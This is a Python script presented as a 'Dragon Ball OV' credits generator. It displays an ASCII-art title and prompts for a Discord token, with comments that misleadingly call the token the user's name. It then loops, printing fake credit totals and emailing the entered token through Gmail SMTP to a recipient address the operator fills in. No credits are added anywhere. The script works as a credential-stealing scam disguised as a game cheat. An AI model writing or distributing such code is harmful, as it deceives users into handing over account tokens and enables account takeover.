import os  # Importing the os module for system-related functions
import pyfiglet  # Importing the pyfiglet module for generating ASCII art text
import smtplib  # Importing the smtplib module for sending emails
from email.mime.text import MIMEText  # Importing MIMEText from email module for creating email content

def clear_screen():
    """
    Clears the terminal screen.
    """
    os.system('cls' if os.name == 'nt' else 'clear')  # Using os.system to clear the terminal screen on Windows ('cls') or Unix ('clear')

def print_dragon_ball_title():
    """
    Prints the stylized Dragon Ball title using pyfiglet.
    """
    dragon_ball_ascii = pyfiglet.figlet_format("Dragon Ball OV", font="slant")  # Generating ASCII art text for the Dragon Ball title
    print(dragon_ball_ascii)  # Printing the Dragon Ball title to the console

def get_user_input():
    """
    Gets user input for their name.
    """
    user_name = input("Enter your discord token: ")  # Prompting the user to enter their name
    return user_name  # Returning the entered user name

def add_credits(name, recipient_email):
    """
    Adds credits to the provided name and sends a notification email.
    """
    credits = 0  # Initializing the credits variable
    credits_increment = 1000  # Setting the increment value for credits

    try:
        while True:
            credits += credits_increment  # Incrementing the credits
            credits_text = f"Adding {credits_increment} credits to {name}. Total credits: {credits}"  # Creating a text message about the credits
            print(credits_text)  # Printing the credits message to the console
            send_email(recipient_email, f"{name} has received {credits} credits")  # Sending an email notification

    except KeyboardInterrupt:
        print("\nCredits transfer interrupted. Exiting...")  # Handling keyboard interrupt (Ctrl+C)

def send_email(recipient_email, message):
    """
    Sends an email using smtplib.
    """
    sender_email = "your_email@gmail.com"  # Replace with the sender's email address
    sender_password = "your_password"  # Replace with the sender's email password

    msg = MIMEText(message)  # Creating an email message with the provided content
    msg['Subject'] = 'Dragon Ball OV Credits Notification'  # Setting the email subject
    msg['From'] = sender_email  # Setting the sender's email address
    msg['To'] = recipient_email  # Setting the recipient's email address

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()  # Starting a TLS connection
            server.login(sender_email, sender_password)  # Logging in to the email server
            server.sendmail(sender_email, recipient_email, msg.as_string())  # Sending the email

    except Exception as e:
        print(f"Error sending email: {e}")  # Handling exceptions during email sending

def main():
    """
    The main function that orchestrates the execution of the script.
    """
    # Clear the screen
    clear_screen()

    # Print Dragon Ball title
    print_dragon_ball_title()

    # Get user input for the name
    user_name = get_user_input()

    # Set the recipient email (replace with the actual email)
    recipient_email = "recipient@example.com"

    # Add credits to the provided name and send email notification
    add_credits(user_name, recipient_email)

if __name__ == "__main__":
    # Execute the main function
    main()
